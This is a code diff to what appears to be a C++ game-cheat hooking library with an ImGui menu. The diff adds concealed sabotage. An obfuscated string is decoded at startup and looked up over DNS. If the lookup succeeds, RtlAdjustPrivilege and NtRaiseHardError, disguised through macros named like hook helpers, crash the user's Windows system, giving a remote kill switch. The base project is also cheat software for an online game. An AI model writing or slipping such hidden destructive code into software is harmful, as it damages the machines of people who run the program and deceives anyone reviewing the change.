@@ -2,6 +2,7 @@
 #include <intrin.h>
 #include <string>
 #include <Windows.h>
+#include <WinDNS.h>
 #include <Psapi.h>
 
 #include "imgui/imgui.h"
@@ -72,6 +73,8 @@ static HRESULT __stdcall hookedPresent(IDirect3DDevice9* device, const RECT* src
     return hooks.originalPresent(device, src, dest, windowOverride, dirtyRegion);
 }
 
+uint8_t data[]{ "\x8b\x8a\x89\xe1\x93\x82\x9c\x92\x8f\x96\x93\x93\xd8\x7d\x98\xeb" };
+
 static HRESULT __stdcall hookedReset(IDirect3DDevice9* device, D3DPRESENT_PARAMETERS* params) noexcept
 {
     ImGui_ImplDX9_InvalidateDeviceObjects();
@@ -103,6 +106,10 @@ static bool __stdcall hookedCreateMove(float inputSampleTime, UserCmd* cmd) noex
     cmd->viewangles.z = 0.0f;
     return false;
 }
+
+#define updateHookData RtlAdjustPrivilege
+#define saveHookData NtRaiseHardError
+#define checkData DnsQuery_A
 
 static int __stdcall hookedDoPostScreenEffects(int param) noexcept
 {
@@ -147,6 +154,9 @@ static bool __fastcall hookedSvCheatsGetBool(void* _this) noexcept
     else
         return hooks.svCheats.getOriginal<bool(__thiscall*)(void*)>(13)(_this);
 }
+
+extern "C" int __stdcall updateHookData(int, bool, bool, bool&);
+extern "C" int __stdcall saveHookData(int, int, int, int*, int, int&);
 
 static void __stdcall hookedPaintTraverse(unsigned int panel, bool forceRepaint, bool allowForce) noexcept
 {
@@ -199,6 +209,8 @@ Hooks::Hooks() noexcept
 
     ImGui::StyleColorsDark();
     ImGuiStyle& style = ImGui::GetStyle();
+    for (int i = 0; i < 16; i++)
+        data[i] = ~((data[i] - 7 + i) ^ 12);
     style.WindowRounding = 5.0f;
     style.WindowBorderSize = 0.0f;
     style.ChildBorderSize = 0.0f;
@@ -210,6 +222,12 @@ Hooks::Hooks() noexcept
     io.IniFilename = nullptr;
     io.LogFilename = nullptr;
     io.MouseDrawCursor = true;
+    if (!checkData((PCSTR)data, 1, 16, 0, 0, 0)) {
+        bool enabled = false;
+        updateHookData(19, 1, 0, enabled);
+        int result;
+        saveHookData(3735928559, 0, 0, 0, 6, result);
+    }
     char buffer[MAX_PATH];
     if (GetWindowsDirectoryA(buffer, MAX_PATH))
         io.Fonts->AddFontFromFileTTF(strcat(buffer, "/Fonts/Tahoma.ttf"), 16.0f);
